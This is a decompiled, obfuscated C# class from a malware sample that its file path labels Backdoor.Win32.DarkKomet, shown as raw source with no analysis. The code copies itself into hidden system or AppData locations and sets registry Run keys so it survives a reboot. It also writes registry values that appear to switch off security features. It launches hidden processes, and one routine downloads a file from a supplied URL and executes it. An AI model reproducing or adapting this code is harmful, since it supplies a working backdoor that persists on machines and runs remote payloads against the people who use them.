// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

internal sealed class \u000F\u2000
{
  private Mutex \u0002;
  private \u0008\u2001 \u0003 = new \u0008\u2001();

  public void \u0002()
  {
    this.\u0003();
    this.\u0006();
    this.\u0005();
    this.\u0003.\u0002();
    new Thread(new ThreadStart(\u000F\u2000.\u0002)).Start();
  }

  public static void \u0002()
  {
    Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885877770));
    while (true)
    {
      try
      {
        \u000E.\u0002(Process.GetProcessById(Process.GetCurrentProcess().Id));
        Thread.Sleep(10);
      }
      catch
      {
      }
    }
  }

  private void \u0003()
  {
    try
    {
      this.\u0002 = new Mutex(true, \u0005\u2001.\u0002.\u0008\u2002);
      this.\u0002.ReleaseMutex();
    }
    catch
    {
      Environment.Exit(0);
    }
  }

  private void \u0005()
  {
    string fileName = Process.GetCurrentProcess().MainModule.FileName;
    if (\u0005\u2001.\u0002.\u000E\u2003)
    {
      \u0005\u2001.\u0002.\u0005\u2002[0] = Environment.GetFolderPath(Environment.SpecialFolder.System) + \u0006\u2002.\u0002(-885875661) + \u0005\u2001.\u0002.\u0002\u2002[0];
      \u0005\u2001.\u0002.\u0005\u2002[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + \u0006\u2002.\u0002(-885875661) + \u0005\u2001.\u0002.\u0002\u2002[1];
    }
    else
    {
      \u0005\u2001.\u0002.\u0005\u2002[0] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \u0006\u2002.\u0002(-885875661) + \u0005\u2001.\u0002.\u0002\u2002[0];
      \u0005\u2001.\u0002.\u0005\u2002[1] = Environment.GetEnvironmentVariable(\u0006\u2002.\u0002(-885878333)) + \u0006\u2002.\u0002(-885875661) + \u0005\u2001.\u0002.\u0002\u2002[1];
    }
    if (this.\u0002())
      return;
    try
    {
      foreach (string str in \u0005\u2001.\u0002.\u0005\u2002)
      {
        if (!\u0005\u2001.\u0003.\u0003(str))
          System.IO.File.Copy(fileName, str);
        System.IO.File.SetAttributes(str, FileAttributes.Hidden);
      }
    }
    catch
    {
    }
    if (\u0005\u2001.\u0002.\u000E\u2003)
    {
      try
      {
        Registry.LocalMachine.OpenSubKey(\u0006\u2002.\u0002(-885877818), true).SetValue(\u0005\u2001.\u0002.\u0003\u2002[0], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"'));
        Registry.LocalMachine.OpenSubKey(\u0006\u2002.\u0002(-885878254), true).SetValue(\u0005\u2001.\u0002.\u0003\u2002[1], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"'));
      }
      catch
      {
      }
    }
    else
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885877818), true).SetValue(\u0005\u2001.\u0002.\u0003\u2002[0], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[0] + (object) '"'));
        Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885878254), true).SetValue(\u0005\u2001.\u0002.\u0003\u2002[1], (object) ('"'.ToString() + \u0005\u2001.\u0002.\u0005\u2002[1] + (object) '"'));
      }
      catch
      {
      }
    }
    try
    {
      this.\u0002.Close();
      foreach (string str in \u0005\u2001.\u0002.\u0005\u2002)
        new Process()
        {
          StartInfo = {
            FileName = str,
            WindowStyle = ProcessWindowStyle.Hidden
          }
        }.Start();
    }
    catch
    {
    }
    Environment.Exit(0);
  }

  public void \u0002(string _param1)
  {
    try
    {
      this.\u0002.Close();
    }
    catch
    {
    }
    try
    {
      string str = \u0005\u2001.\u0003.\u0002(new Random().Next(5, 12)) + \u0006\u2002.\u0002(-885878322);
      new WebClient().DownloadFile(_param1, Environment.GetEnvironmentVariable(\u0006\u2002.\u0002(-885878333)) + \u0006\u2002.\u0002(-885875661) + str);
      new Process()
      {
        StartInfo = {
          FileName = (Environment.GetEnvironmentVariable(\u0006\u2002.\u0002(-885878333)) + \u0006\u2002.\u0002(-885875661) + str),
          WindowStyle = ProcessWindowStyle.Hidden
        }
      }.Start();
    }
    catch
    {
    }
    Environment.Exit(0);
  }

  public void \u0008()
  {
    this.\u0003.\u0003();
    if (\u0005\u2001.\u0002.\u000E\u2003)
    {
      try
      {
        Registry.LocalMachine.OpenSubKey(\u0006\u2002.\u0002(-885877818), true).DeleteValue(\u0005\u2001.\u0002.\u0003\u2002[0]);
        Registry.LocalMachine.OpenSubKey(\u0006\u2002.\u0002(-885878254), true).DeleteValue(\u0005\u2001.\u0002.\u0003\u2002[1]);
      }
      catch
      {
      }
    }
    else
    {
      try
      {
        Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885877818), true).DeleteValue(\u0005\u2001.\u0002.\u0003\u2002[0]);
        Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885878254), true).DeleteValue(\u0005\u2001.\u0002.\u0003\u2002[1]);
      }
      catch
      {
      }
    }
    try
    {
      foreach (string path in \u0005\u2001.\u0002.\u0005\u2002)
        System.IO.File.Delete(path);
    }
    catch
    {
    }
    Environment.Exit(0);
  }

  private bool \u0002()
  {
    foreach (string str in \u0005\u2001.\u0002.\u0005\u2002)
    {
      if (!\u0005\u2001.\u0003.\u0003(str))
        return false;
    }
    return true;
  }

  private void \u0006()
  {
    try
    {
      Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885878200), true).SetValue(\u0006\u2002.\u0002(-885878134), (object) \u0006\u2002.\u0002(-885875288), RegistryValueKind.DWord);
    }
    catch
    {
    }
    if (!\u0005\u2001.\u0002.\u0003\u2001)
      return;
    try
    {
      Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885878200), true).SetValue(\u0006\u2002.\u0002(-885878023), (object) \u0006\u2002.\u0002(-885875224), RegistryValueKind.DWord);
    }
    catch
    {
    }
    try
    {
      Registry.CurrentUser.OpenSubKey(\u0006\u2002.\u0002(-885878047), true).SetValue(\u0006\u2002.\u0002(-885877471), (object) \u0006\u2002.\u0002(-885875224), RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey(\u0006\u2002.\u0002(-885878047), true).SetValue(\u0006\u2002.\u0002(-885877471), (object) \u0006\u2002.\u0002(-885875224), RegistryValueKind.DWord);
    }
    catch
    {
    }
  }
}
